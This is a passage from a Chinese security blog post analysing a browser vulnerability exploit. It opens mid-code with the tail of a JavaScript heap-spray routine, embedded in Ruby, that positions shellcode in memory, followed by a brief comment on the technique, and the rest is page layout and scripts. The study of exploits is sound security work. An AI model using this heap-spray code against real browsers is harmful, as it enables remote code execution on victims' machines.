class="subst">#&#123;var_c&#125;</span>.length + 20 + 8 &lt; <span class="subst">#&#123;var_s&#125;</span>) <span class="subst">#&#123;var_c&#125;</span>+=<span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> = <span class="subst">#&#123;var_c&#125;</span>.substring(0, (0x0c0c-0x24)/2);</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_shellcode&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_d&#125;</span> = <span class="subst">#&#123;var_b&#125;</span>.substring(0, <span class="subst">#&#123;var_s&#125;</span>/2);</span></span><br><span class="line"><span class="string">while(<span class="subst">#&#123;var_d&#125;</span>.length &lt; 0x80000) <span class="subst">#&#123;var_d&#125;</span> += <span class="subst">#&#123;var_d&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_3&#125;</span> = <span class="subst">#&#123;var_d&#125;</span>.substring(0, 0x80000 - (0x1020-0x08) / 2);</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_4&#125;</span> = new Array();</span></span><br><span class="line"><span class="string">for (<span class="subst">#&#123;var_i&#125;</span>=0;<span class="subst">#&#123;var_i&#125;</span>&lt;0x1f0;<span class="subst">#&#123;var_i&#125;</span>++) <span class="subst">#&#123;var_4&#125;</span>[<span class="subst">#&#123;var_i&#125;</span>]=<span class="subst">#&#123;var_3&#125;</span>+"s";</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"></span><br><span class="line">		js</span><br><span class="line">	<span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
<p>就是和上一步的调试的结果差不多，就是布置 <code>shellcode</code>，堆喷射之类的，<code>and [esp+ebx*2],edi</code> 感觉这个指令用的好6。大概就是这些了。</p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/old-blog/" rel="tag"><i class="fa fa-tag"></i> old_blog</a>
          
            <a href="/tags/vuln/" rel="tag"><i class="fa fa-tag"></i> vuln</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/09/rctf-2018/" rel="next" title="rctf 2018 babyheap">
                <i class="fa fa-chevron-left"></i> rctf 2018 babyheap
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/09/CVE-2012-1876/" rel="prev" title="CVE-2012-1876">
                CVE-2012-1876 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  
    <div class="comments" id="comments">
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="V4kst1z">
            
              <p class="site-author-name" itemprop="name">V4kst1z</p>
              <p class="site-description motion-element" itemprop="description">Bin Dog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">7</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">7</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/Vsane" title="GitHub &rarr; https://github.com/Vsane" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://twitter.com/v4kst1z" title="Twitter &rarr; https://twitter.com/v4kst1z" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            </div>
          

          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/qq_29343201" title="https://blog.csdn.net/qq_29343201" rel="noopener" target="_blank">Anciety</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://aryb1n.github.io/" title="https://aryb1n.github.io/" rel="noopener" target="_blank">Aryb1n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://52yuluo.top/" title="http://52yuluo.top/" rel="noopener" target="_blank">Yuluo</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞概览"><span class="nav-number">1.</span> <span class="nav-text">漏洞概览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#触发条件"><span class="nav-number">2.</span> <span class="nav-text">触发条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用技巧"><span class="nav-number">3.</span> <span class="nav-text">利用技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit分析"><span class="nav-number">4.</span> <span class="nav-text">exploit分析</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V4kst1z</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="Total Visitors">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="Total Views">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=6.7.0"></script>

  <script src="/js/src/motion.js?v=6.7.0"></script>



  
  


  <script src="/js/src/affix.js?v=6.7.0"></script>

  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>




  
  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
<script src="/js/src/post-details.js?v=6.7.0"></script>



  


  <script src="/js/src/bootstrap.js?v=6.7.0"></script>



  
  




  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function (item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: '3awIpSk2hfHaeA1glDs5NtYG-gzGzoHsz',
    appKey: '6ORiR0zVaYi0ljkwUfSn0aWG',
    placeholder: 'Just go go',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false
  });
</script>



  





  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
